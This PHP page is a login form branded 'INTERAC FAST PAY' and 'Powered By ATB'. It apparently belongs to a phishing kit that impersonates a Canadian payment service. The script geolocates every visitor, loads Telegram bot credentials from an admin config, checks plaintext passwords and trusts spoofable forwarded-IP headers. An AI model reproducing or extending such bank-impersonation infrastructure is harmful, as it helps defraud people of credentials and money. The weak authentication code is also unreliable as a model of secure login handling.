<?php
include_once 'include/watchdog.php';

// Function to get the client's IP address
function getClientIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } elseif (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }
    return $ipaddress;
}

// Function to increment the failed login attempts for a given IP address
function incrementFailedAttempts($ip) {
    $file = 'failed_attempts.txt';
    $failedAttempts = [];

    // Read the existing failed attempts from the file
    if (file_exists($file)) {
        $failedAttempts = json_decode(file_get_contents($file), true);
    }

    // Increment the failed attempts count for the IP address
    if (isset($failedAttempts[$ip])) {
        $failedAttempts[$ip]++;
    } else {
        $failedAttempts[$ip] = 1;
    }

    // Write the updated failed attempts back to the file
    file_put_contents($file, json_encode($failedAttempts));

    return $failedAttempts[$ip];
}

// Get the client's IP address
$PublicIP = getClientIP();

// Fetch geolocation details using IP address
$geoDetails = file_get_contents("http://ipwhois.app/json/$PublicIP");
$geoData = json_decode($geoDetails, true);

// Include configuration
$configFile = $_SERVER['DOCUMENT_ROOT'] . '/admin/config.php';
if (file_exists($configFile)) {
    $config = include($configFile);
} else {
    die("Config file not found");
}

$telegramConfig = $config['TELEGRAM_BOTS']['ADMIN'] ?? [];
$apiToken = $telegramConfig['token'] ?? '';
$chatId = $telegramConfig['chatId'] ?? '';

// Check if Telegram API token or chat ID is missing or empty
if (empty($apiToken) || empty($chatId)) {
    die("Telegram API token or chat ID is missing or empty in config.php");
}

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $ip = $_SERVER['REMOTE_ADDR'];
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Load users and their login locations from the config file
    $users = $config['USERS'] ?? [];

    // Check if the username exists and the password is correct
    foreach ($users as $user => $data) {
        if ($username === $user && $password === $data['password']) {
            // Redirect to the user's specific location
            header("Location: " . $data['location']);
            exit;
        }
    }

    // Increment failed login attempts and redirect to error page
    incrementFailedAttempts($ip);
    header("Location: error_page.php?message=Invalid%20username%20or%20password");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>INTERAC FAST PAY - Login</title>
    <style>
        /* Global styles */
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        /* Logo */
        .logo {
            width: 80px; /* Adjust the width of the logo */
            height: 80px; /* Adjust the height of the logo */
            margin-bottom: 20px;
        }

        /* Form styles */
        form {
            margin-bottom: 20px;
        }

        .input-field {
            width: 80%; /* Adjust the input field width as needed */
            max-width: 300px; /* Set a maximum width for smaller screens */
            padding: 10px;
            margin: 10px 0;
            border: 2px solid #333;
            border-radius: 5px;
            font-size: 18px;
            background-color: transparent;
            color: #fff;
        }

        .action-button {
            width: 80%; /* Adjust the button width as needed */
            max-width: 300px; /* Set a maximum width for smaller screens */
            padding: 15px;
            background-color: #333;
            color: #FFD700;
            text-decoration: none;
            font-size: 18px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            transition: background-color 0.3s, color 0.3s;
            cursor: pointer;
        }

        .action-button:hover {
            background-color: #555;
        }

        /* Powered By ATB */
        .powered-by {
            font-size: 14px;
            color: #FFD700;
        }
    </style>
</head>
<body>
    <!-- Logo -->
    <img class="logo" src="https://www.logolynx.com/images/logolynx/s_30/30b26a477d32c2f1025e7b4573f5062f.jpeg" alt="Logo">

    <!-- Login Form -->
    <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
        <input class="input-field" type="text" name="username" placeholder="Username" required>
        <input class="input-field" type="password" name="password" placeholder="Password" required>
        <button class="action-button" type="submit">Login</button>
    </form>

    <!-- Powered By ATB -->
    <p class="powered-by">Powered By ATB</p>
</body>
</html>
